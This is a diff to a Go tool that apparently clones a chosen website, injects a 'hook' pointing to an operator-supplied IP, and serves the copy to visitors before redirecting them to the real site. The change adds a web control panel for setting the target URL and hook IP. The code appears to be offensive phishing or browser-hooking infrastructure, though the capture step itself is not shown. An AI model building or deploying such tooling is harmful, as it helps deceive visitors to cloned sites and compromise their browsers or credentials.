@@ -1,7 +1,6 @@
 package main
 
 import (
-	"bufio"
 	"fmt"
 	"io/ioutil"
 	"net/http"
@@ -12,13 +11,14 @@ import (
 )
 
 var (
-	hooktemplate              *template.Template
-	logf                      *os.File
-	cloneurl, port, ipforhook string
+	hooktemplate, thehooktmpl, abouttmpl *template.Template
+	logf                                 *os.File
+	cloneurl, port, ipforhook            string
 )
 
 func init() {
-	//statustemplate = template.Must(template.ParseFiles("templates/status.html"))
+	thehooktmpl = template.Must(template.ParseFiles("templates/thehook.html"))
+	abouttmpl = template.Must(template.ParseFiles("templates/about.html"))
 	port = "80"
 }
 
@@ -62,6 +62,8 @@ func updatehook() {
 
 	//fmt.Println(newstring)
 	fi.WriteString(newstring)
+	hooktemplate = template.Must(template.ParseFiles("templates/hook.html"))
+
 }
 
 /*func status(httpw http.ResponseWriter, req *http.Request) {
@@ -82,6 +84,26 @@ func updatehook() {
 	}
 }*/
 
+func thehook(httpw http.ResponseWriter, req *http.Request) {
+	if req.Method == "GET" {
+		err := thehooktmpl.Execute(httpw, nil)
+		checkerr(err)
+	} else {
+		err := req.ParseForm()
+		checkerr(err)
+		ipforhook = req.Form.Get("ip")
+		cloneurl = req.Form.Get("clone")
+		cloneurl = strings.TrimSpace(cloneurl)
+
+		clonehook(cloneurl)
+		updatehook()
+		//hooktemplate = template.Must(template.ParseFiles("templates/hook.html"))
+		//startcloneserver()
+		err = thehooktmpl.Execute(httpw, nil)
+		checkerr(err)
+
+	}
+}
 func index(httpw http.ResponseWriter, req *http.Request) {
 	if req.Method == "GET" {
 		err := hooktemplate.Execute(httpw, nil)
@@ -114,20 +136,32 @@ func index(httpw http.ResponseWriter, req *http.Request) {
 				}
 			}
 		}
-
+		fmt.Println("cloned url is " + cloneurl)
 		http.Redirect(httpw, req, cloneurl, http.StatusSeeOther)
 	}
 
 }
 
+func about(httpwr http.ResponseWriter, req *http.Request) {
+	if req.Method == "GET" {
+		err := abouttmpl.Execute(httpwr, nil)
+		if err != nil {
+			fmt.Println(err)
+		}
+	}
+}
+
 func startcloneserver() {
-	http.HandleFunc("/", index)
-	http.ListenAndServe(":"+port, nil)
+	http.HandleFunc("/thehook", thehook)
+	http.HandleFunc("/about", about)
+
+	http.Handle("/static/css/", http.StripPrefix("/static/css/", http.FileServer(http.Dir("static/css"))))
+	http.ListenAndServe(":"+"8085", nil)
 
 }
 func main() {
 	fmt.Println("Hook Started...")
-	reader := bufio.NewReader(os.Stdin)
+	/*reader := bufio.NewReader(os.Stdin)
 	fmt.Print("Enter URL to clone : ")
 	cloneurl, _ = reader.ReadString('\n')
 	fmt.Print("Enter IP you want to listen for : ")
@@ -137,8 +171,9 @@ func main() {
 	//fmt.Println("URL : ", cloneurl)
 
 	clonehook(cloneurl)
-	updatehook()
-	hooktemplate = template.Must(template.ParseFiles("templates/hook.html"))
-	startcloneserver()
+	updatehook()*/
+	go startcloneserver()
+	http.HandleFunc("/", index)
+	http.ListenAndServe(":"+port, nil)
 
 }
